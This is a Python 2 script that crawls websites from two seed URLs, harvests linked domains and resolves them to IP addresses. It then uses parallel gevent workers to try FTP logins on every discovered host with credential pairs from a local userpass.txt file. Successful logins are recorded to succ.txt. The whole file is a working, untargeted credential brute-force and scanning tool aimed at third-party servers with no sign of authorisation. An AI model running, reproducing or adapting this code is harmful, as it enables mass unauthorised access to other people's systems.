#!/usr/bin/env python
import ftplib
import re
import socket
import urllib2
import gevent
from gevent import monkey
from gevent import queue
monkey.patch_all()


passwdFile = 'userpass.txt'
hosts = queue.Queue()
hostpool=queue.Queue()
hostset=set()
hostpool.put("http://www.pennlive.com")
hostset.add("http://www.pennlive.com/")

hostpool.put("http://phishlist.com")
hostset.add("http://phishlist.com")
def bruteLogin(dic):
    while True:
        if hosts.empty():
            #print 'hosts empty'
            gevent.sleep(0)
            continue
        hostname=hosts.get()
        print hostname
        
        for userName in dic.keys():
            passWord=dic[userName]
            print "[+] Trying: "+userName+"/"+passWord
            try:
                with gevent.Timeout(3, False) as timeout:
                    ftp = ftplib.FTP(hostname)
                    ftp.login(userName, passWord)
                    print '\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord
                    succ=open('succ.txt','a')
                    succ.write('\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord)
                    succ.close()
                    ftp.quit()
            except Exception, e:
                pass
            print 'login {0} wrong.'.format(hostname)

        
def scanhost():
    while True:
        if not hosts.empty():
            gevent.sleep(0)
        if hostpool.empty():
            print 'no host'
        host=hostpool.get()
        #connect to a URL
        print host
        try:
            with gevent.Timeout(10, False) as timeout:
                website = urllib2.urlopen(host)
                #read html code
                html = website.read()
                #use re.findall to get all the links
                links = re.findall('"(((http|ftp)?://([^\'\"=:;,?<>]*?\.(net|com|cn|gov|cc|tv|tk|me|edu|uk|info|nl|cf|ga|ly|hk|us|xyz|aisa|top|gq|ml|jp)))[/\' \"].*?)"', html,re.I)

                for link in links:
                    if link[3] not in hostset:
                        try: 
                            ip = socket.gethostbyname(link[3]) 
                            hosts.put(ip)
                            hostset.add(link[3])
                            hostpool.put(link[1])
                        except Exception,e:
                            print 'gethost:'+link[3]+str(e)

        except Exception,e:
            print 'urlopen:'+host+str(e)



pF = open(passwdFile, 'r')
dic={}
for line in pF.readlines():
    userName=line.split(':')[0]
    passWord=line.split(':')[1].strip('\r').strip('\n')
    dic[userName]=passWord
bure1=gevent.spawn(bruteLogin,dic)
bure2=gevent.spawn(bruteLogin,dic)
bure3=gevent.spawn(bruteLogin,dic)
bure4=gevent.spawn(bruteLogin,dic)
bure5=gevent.spawn(bruteLogin,dic)
bure6=gevent.spawn(bruteLogin,dic)
scan=gevent.spawn(scanhost)
gevent.joinall((scan,bure1,bure2,bure3,bure4,bure5,bure6))
